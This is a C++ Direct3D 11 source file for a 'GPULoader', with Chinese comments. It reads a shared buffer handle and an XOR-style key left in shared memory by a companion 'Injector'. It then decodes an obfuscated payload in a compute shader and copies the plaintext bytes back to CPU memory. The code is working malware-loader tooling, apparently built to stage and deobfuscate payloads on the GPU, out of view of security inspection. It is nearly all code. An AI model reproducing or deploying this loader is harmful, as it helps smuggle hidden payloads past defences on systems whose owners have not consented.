#include "GPULoader.h"
#include "SharedStructures.h"
#include <d3dcompiler.h>
#include <iostream>
#include <fstream>
#include <vector>

GPULoader::GPULoader()
    : device(nullptr)
    , context(nullptr)
    , encodedBuffer(nullptr)
    , decodedBuffer(nullptr)
    , stagingBuffer(nullptr)
    , constantBuffer(nullptr)
    , decodeShader(nullptr)
    , encodedSRV(nullptr)
    , decodedUAV(nullptr)
    , sharedBufferHandle(nullptr)
    , payloadSize(0)
    , encodeKey(0)
{
}

GPULoader::~GPULoader() {
    cleanup();
}

bool GPULoader::initialize() {
    D3D_FEATURE_LEVEL featureLevel;
    UINT createFlags = 0;

#ifdef _DEBUG
    createFlags |= D3D11_CREATE_DEVICE_DEBUG;
#endif

    HRESULT hr = D3D11CreateDevice(
        nullptr,
        D3D_DRIVER_TYPE_HARDWARE,
        nullptr,
        createFlags,
        nullptr,
        0,
        D3D11_SDK_VERSION,
        &device,
        &featureLevel,
        &context
    );

    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create d3d11 device\n";
        return false;
    }

    return loadComputeShader();
}

bool GPULoader::loadComputeShader() {
    std::ifstream shaderFile("..\\..\\Shaders\\DecodePayload.cso", std::ios::binary | std::ios::ate);
    if (!shaderFile.is_open()) {
        std::cerr << "[gpuloader] failed to open shader file\n";
        return false;
    }

    std::streamsize size = shaderFile.tellg();
    shaderFile.seekg(0, std::ios::beg);

    std::vector<char> shaderBytecode(size);
    if (!shaderFile.read(shaderBytecode.data(), size)) {
        std::cerr << "[gpuloader] failed to read shader\n";
        return false;
    }

    // 目标端只保存编译好的字节码，运行时加载到 D3D 设备。
    HRESULT hr = device->CreateComputeShader(
        shaderBytecode.data(),
        shaderBytecode.size(),
        nullptr,
        &decodeShader
    );

    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create compute shader\n";
        return false;
    }

    return true;
}

bool GPULoader::loadSharedGPUData() {
    // 读取 Injector 写入的共享内存以取得共享缓冲句柄及元数据。
    HANDLE hSharedMem = OpenFileMappingW(
        FILE_MAP_READ,
        FALSE,
        GPUInject::SHARED_MEMORY_NAME
    );

    if (!hSharedMem) {
        std::cerr << "[gpuloader] failed to open shared memory\n";
        return false;
    }

    void* mappedView = MapViewOfFile(
        hSharedMem,
        FILE_MAP_READ,
        0,
        0,
        sizeof(GPUInject::SharedGPUData)
    );

    if (!mappedView) {
        std::cerr << "[gpuloader] failed to map view\n";
        CloseHandle(hSharedMem);
        return false;
    }

    GPUInject::SharedGPUData* sharedData = static_cast<GPUInject::SharedGPUData*>(mappedView);
    sharedBufferHandle = sharedData->encodedBufferHandle;
    payloadSize = sharedData->payloadSize;
    encodeKey = sharedData->encodeKey;

    UnmapViewOfFile(mappedView);
    CloseHandle(hSharedMem);

    return openSharedBuffer();
}

bool GPULoader::openSharedBuffer() {
    // 将 DXGI 共享句柄重新打开成当前设备可用的 ID3D11Buffer。
    HRESULT hr = device->OpenSharedResource(
        sharedBufferHandle,
        __uuidof(ID3D11Buffer),
        (void**)&encodedBuffer
    );

    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to open shared buffer\n";
        return false;
    }

    IDXGIKeyedMutex* keyedMutex = nullptr;
    hr = encodedBuffer->QueryInterface(__uuidof(IDXGIKeyedMutex), (void**)&keyedMutex);
    if (SUCCEEDED(hr)) {
        hr = keyedMutex->AcquireSync(0, INFINITE);
        if (FAILED(hr)) {
            std::cerr << "[gpuloader] failed to acquire keyed mutex\n";
            keyedMutex->Release();
            return false;
        }
        keyedMutex->Release();
    }

    return createDecodeResources();
}

bool GPULoader::createDecodeResources() {
    D3D11_BUFFER_DESC encodedDesc;
    encodedBuffer->GetDesc(&encodedDesc);

    // 为共享缓冲区创建 SRV/UAV，从而在计算着色器中读取编码数据并写入解码结果。
    D3D11_SHADER_RESOURCE_VIEW_DESC srvDesc = {};
    srvDesc.Format = DXGI_FORMAT_UNKNOWN;
    srvDesc.ViewDimension = D3D11_SRV_DIMENSION_BUFFER;
    srvDesc.Buffer.FirstElement = 0;
    srvDesc.Buffer.NumElements = encodedDesc.ByteWidth / sizeof(uint32_t);

    HRESULT hr = device->CreateShaderResourceView(encodedBuffer, &srvDesc, &encodedSRV);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create srv\n";
        return false;
    }

    D3D11_BUFFER_DESC decodedDesc = {};
    decodedDesc.ByteWidth = encodedDesc.ByteWidth;
    decodedDesc.Usage = D3D11_USAGE_DEFAULT;
    decodedDesc.BindFlags = D3D11_BIND_UNORDERED_ACCESS;
    decodedDesc.MiscFlags = D3D11_RESOURCE_MISC_BUFFER_STRUCTURED;
    decodedDesc.StructureByteStride = sizeof(uint32_t);

    hr = device->CreateBuffer(&decodedDesc, nullptr, &decodedBuffer);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create decoded buffer\n";
        return false;
    }

    D3D11_UNORDERED_ACCESS_VIEW_DESC uavDesc = {};
    uavDesc.Format = DXGI_FORMAT_UNKNOWN;
    uavDesc.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
    uavDesc.Buffer.FirstElement = 0;
    uavDesc.Buffer.NumElements = encodedDesc.ByteWidth / sizeof(uint32_t);

    hr = device->CreateUnorderedAccessView(decodedBuffer, &uavDesc, &decodedUAV);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create uav\n";
        return false;
    }

    // CPU 侧 staging buffer 用于 CopyResource 后 map 回系统内存。
    D3D11_BUFFER_DESC stagingDesc = {};
    stagingDesc.ByteWidth = encodedDesc.ByteWidth;
    stagingDesc.Usage = D3D11_USAGE_STAGING;
    stagingDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;

    hr = device->CreateBuffer(&stagingDesc, nullptr, &stagingBuffer);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create staging buffer\n";
        return false;
    }

    struct DecodeParams {
        uint32_t payloadSizeInDwords;
        uint32_t encodeKey;
        uint32_t padding[2];
    };

    DecodeParams params;
    params.payloadSizeInDwords = (payloadSize + 3) / 4;
    params.encodeKey = encodeKey;

    // 常量缓冲封装 payload 总长度与密钥，供 compute shader 复原字流。
    D3D11_BUFFER_DESC cbDesc = {};
    cbDesc.ByteWidth = sizeof(DecodeParams);
    cbDesc.Usage = D3D11_USAGE_DEFAULT;
    cbDesc.BindFlags = D3D11_BIND_CONSTANT_BUFFER;

    D3D11_SUBRESOURCE_DATA cbData = {};
    cbData.pSysMem = &params;

    hr = device->CreateBuffer(&cbDesc, &cbData, &constantBuffer);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to create constant buffer\n";
        return false;
    }

    return true;
}

bool GPULoader::decodePayloadOnGPU() {
    // 设置计算着色器绑定并 dispatch，逆向执行与 Injector 同样的混淆逻辑。
    context->CSSetShader(decodeShader, nullptr, 0);
    context->CSSetShaderResources(0, 1, &encodedSRV);
    context->CSSetUnorderedAccessViews(0, 1, &decodedUAV, nullptr);
    context->CSSetConstantBuffers(0, 1, &constantBuffer);

    uint32_t numDwords = (payloadSize + 3) / 4;
    uint32_t numGroups = (numDwords + GPUInject::DECODE_THREAD_GROUP_SIZE - 1) /
                         GPUInject::DECODE_THREAD_GROUP_SIZE;

    context->Dispatch(numGroups, 1, 1);

    ID3D11ShaderResourceView* nullSRV = nullptr;
    ID3D11UnorderedAccessView* nullUAV = nullptr;
    context->CSSetShaderResources(0, 1, &nullSRV);
    context->CSSetUnorderedAccessViews(0, 1, &nullUAV, nullptr);

    // 将 GPU 解码结果拷贝到 staging buffer，便于后续 Map。
    context->CopyResource(stagingBuffer, decodedBuffer);

    return true;
}

std::vector<uint8_t> GPULoader::retrieveDecodedPayload() {
    std::vector<uint8_t> payload;

    D3D11_MAPPED_SUBRESOURCE mapped;
    // Map 后直接复制 payloadSize 字节回到 CPU 内存。
    HRESULT hr = context->Map(stagingBuffer, 0, D3D11_MAP_READ, 0, &mapped);
    if (FAILED(hr)) {
        std::cerr << "[gpuloader] failed to map staging buffer\n";
        return payload;
    }

    payload.resize(payloadSize);
    memcpy(payload.data(), mapped.pData, payloadSize);

    context->Unmap(stagingBuffer, 0);

    return payload;
}

void GPULoader::cleanup() {
    if (encodedSRV) {
        encodedSRV->Release();
        encodedSRV = nullptr;
    }
    if (decodedUAV) {
        decodedUAV->Release();
        decodedUAV = nullptr;
    }
    if (decodeShader) {
        decodeShader->Release();
        decodeShader = nullptr;
    }
    if (constantBuffer) {
        constantBuffer->Release();
        constantBuffer = nullptr;
    }
    if (stagingBuffer) {
        stagingBuffer->Release();
        stagingBuffer = nullptr;
    }
    if (decodedBuffer) {
        decodedBuffer->Release();
        decodedBuffer = nullptr;
    }
    if (encodedBuffer) {
        encodedBuffer->Release();
        encodedBuffer = nullptr;
    }
    if (context) {
        context->Release();
        context = nullptr;
    }
    if (device) {
        device->Release();
        device = nullptr;
    }
}
